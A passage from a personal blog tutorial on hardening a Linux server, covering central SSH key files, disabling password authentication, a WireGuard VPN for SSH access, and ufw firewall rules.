<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo setfacl -m u:alfred:r /etc/ssh/authorized_keys/alfred
</span></span></code></pre></td></tr></table>
</div>
</div><p>If <code>setfacl</code> doesn’t exist, install it with <code>sudo apt install acl</code>.</p>
<p>Before continuing, make sure that your user can read their <code>authorized_keys</code> file:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>cat /etc/ssh/authorized/keys/$USER
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you can’t read it now, SSH won’t be able to read it from your account either, and you’ll be locked out.</p>
<p>Now configure SSH to read public keys from our central directory by adding this to <code>/etc/ssh/sshd_config</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>AuthorizedKeysFile /etc/ssh/authorized_keys/%u
</span></span></code></pre></td></tr></table>
</div>
</div><p>While we’re editing <code>sshd_config</code>, we also want to disable password logins (this may already be set):</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>PasswordAuthentication no
</span></span></code></pre></td></tr></table>
</div>
</div><p>Restart <code>sshd</code> for those changes to take effect:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo systemctl restart ssh
</span></span></code></pre></td></tr></table>
</div>
</div><p>Don’t log out yet. But do log in from another terminal window to make sure it works.</p>
<p>If you have an old <code>authorized_keys</code> file, delete it: <code>rm ~/.ssh/authorized_keys</code> (it isn’t insecure, it’s just confusing to leave an unused file in place).</p>
<h2 id="wireguard">WireGuard<a hidden class="anchor" aria-hidden="true" href="#wireguard">#</a></h2>
<p>We’ve done the basics to lock down SSH. But, ideally, SSH would not be accessible from the Internet. You could use firewall rules to restrict access to specific IP addresses. But in my case, I have a dynamic IP, and I don’t want to run a bastion host, so that won’t work for me. Fortunately, <a href="https://www.wireguard.com/">WireGuard</a> makes running a VPN easy.</p>
<p>If you haven’t heard of it, WireGuard is a peer-to-peer VPN. There isn’t a central server. On each host, you set the public keys of its authorized peers. It’s a little bit work to configure, but it works well.</p>
<p>One drawback to WireGuard is that the connection goes both ways. If your server is compromised, the attacker can reach any configured peer. Personally, I have the other side of the WireGuard tunnel in a local VM that blocks inbound connections from the tunnel.</p>
<p>However you do it, I will assume you have some other host already configured with WireGuard. Before we get started, you’ll need:</p>
<ul>
<li>The public key and private IP of the peer you want to connect from.</li>
<li>The private IP to assign to the server. It should be in the same subnet as the peer.</li>
</ul>
<p>Start by installing WireGuard. It’s simple in Debian Bullseye and recent Ubuntu versions:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt install wireguard 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now generate a key pair:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo mkdir -p /etc/wireguard
</span></span><span style="display:flex;"><span>sudo sh -c &#39;wg genkey | tee /etc/wireguard/private_key | wg pubkey &gt; /etc/wireguard/public_key&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>And create a config file in <code>/etc/wireguard/wg0.conf</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[Interface]
</span></span><span style="display:flex;"><span>Address = 192.168.50.2/24
</span></span><span style="display:flex;"><span>PrivateKey = &lt;THE PRIVATE KEY&gt;
</span></span><span style="display:flex;"><span>ListenPort = 12345
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[Peer]
</span></span><span style="display:flex;"><span>PublicKey = u8Uo3ab+psKeOpciUIaNuBulNrOCXrU8GN3yD06/0WM=
</span></span><span style="display:flex;"><span>AllowedIPs = 192.168.50.1/32
</span></span></code></pre></td></tr></table>
</div>
</div><p>You’ll need to set the address to an IP on the same subnet as the computer you’re accessing it from. Also, configure the correct <code>AllowedIPs</code> and <code>PublicKey</code>. You can copy/paste the <code>PrivateKey</code>, or use <code>:r /etc/wireguard/private_key</code> in VIM.</p>
<p>Set <code>ListenPort</code> to any random ephemeral port number. You can generate one in Bash:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">echo</span> <span style="color:#fff;font-weight:bold">$((</span>$SRANDOM % <span style="color:#ff0;font-weight:bold">55535</span> + <span style="color:#ff0;font-weight:bold">10000</span><span style="color:#fff;font-weight:bold">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The port number isn’t a secret per se, but WireGuard hides itself well, so we might as well prevent an attacker from knowing it.</p>
<p>If your cloud provider has a firewall, don’t forget to open WireGuard’s UDP port.</p>
<p>Now start WireGuard:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo systemctl start wg-quick@wg0
</span></span><span style="display:flex;"><span>sudo systemctl <span style="color:#fff;font-weight:bold">enable</span> wg-quick@wg0
</span></span></code></pre></td></tr></table>
</div>
</div><p>Don’t forget to configure the server as a peer on the computer you’re connecting from. Make sure you can connect to SSH through the WireGuard IP.</p>
<h2 id="firewall">Firewall<a hidden class="anchor" aria-hidden="true" href="#firewall">#</a></h2>
<p>Your cloud provider probably has a firewall already. If you’re happy with that, allow WireGuard, block SSH, and call it a day. But if you don’t don’t like that firewall, you can install one on the server.</p>
<p>On Debian based systems, I use <code>ufw</code>. Install it with:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo apt install ufw
</span></span></code></pre></td></tr></table>
</div>
</div><p>The first rule we need allows anyone to access the WireGuard port. Change <code>$WG_PORT</code> to whatever you configured in <code>/etc/wireguard/wg0.conf</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo ufw allow in on eth0 to any port $WG_PORT proto udp
</span></span></code></pre></td></tr></table>
</div>
</div><p>Also run <code>ip a</code> and make sure the interface you want to filter is actually <code>eth0</code>, sometimes it may not be.</p>
<p>Now we want to allow SSH on WireGuard:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo ufw allow in on wg0 to any port <span style="color:#ff0;font-weight:bold">22</span> proto tcp
</span></span></code></pre></td></tr></table>
</div>
</div><p>And add any other ports you want open:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo ufw allow in on eth0 to any port <span style="color:#ff0;font-weight:bold">80</span> proto tcp
</span></span><span style="display:flex;"><span>sudo ufw allow in on eth0 to any port <span style="color:#ff0;font-weight:bold">443</span> proto tcp
</span></span></code></pre></td></tr></table>
</div>
</div><p>When your rules are in place, cross your fingers and turn on <code>ufw</code>:</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo ufw <span style="color:#fff;font-weight:bold">enable</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>With any luck, SSH remains connected. Don’t log out until you confirm you can get a new SSH connection.</p>
<h2 id="next-steps">Next steps<a hidden class="anchor" aria-hidden="true" href="#next-steps">#</a></h2>
<p>There are a few more things you should consider:</p>
<ul>
<li>Find a process to keep your system up to date. Debian’s <a href="https://wiki.debian.org/AutomatedUpgrade">Automatic Update</a> is one option, though you may want some oversight.</li>
<li>Most attacks won’t be against what we’ve covered in this guide, but against the applications you install next. Properly done, containers can limit the impact.</li>
</ul>
<p>Finally, you should automate the job of initializing your host. With practice, this process can be done manually in about 30 minutes, but your automation will be a couple of minutes at most. Manually typing the commands is also error-prone, and a few steps can lock you out if you aren’t careful.</p>
<p>If you aren’t sure where to start with automation, I suggest you start simple. For example, write an init script that gets your host to a known state before Ansible (or a similar tool) takes over.</p>
<p>If you want to use an init script, I have published some <a href="https://github.com/pboyd/initscripts">scripts</a> which do everything in this blog post, which you can use directly or as a base for what you really need.</p>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://funny-toffee-4aa7c3.netlify.app/tags/linux/">linux</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://funny-toffee-4aa7c3.netlify.app/">Wjy&#39;s Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
